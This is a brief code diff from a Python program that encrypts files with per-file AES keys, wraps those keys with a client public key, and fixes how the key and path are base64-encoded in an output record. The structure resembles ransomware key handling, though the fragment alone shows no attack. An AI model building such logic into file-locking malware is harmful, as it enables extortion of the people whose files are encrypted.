@@ -107,7 +107,7 @@ def menu():
         for (aes_key, base64_path) in start_encryption(files):
             encrypted_aes_key = client_public_key_object_cipher.encrypt(aes_key)
 
-            line = base64.b64encode(base64_path).decode('utf-8') + " " + encrypted_aes_key + "\n"
+            line = base64.b64encode(encrypted_aes_key).decode('utf-8') + " " + base64_path + "\n"
             f.write(line)
 
 
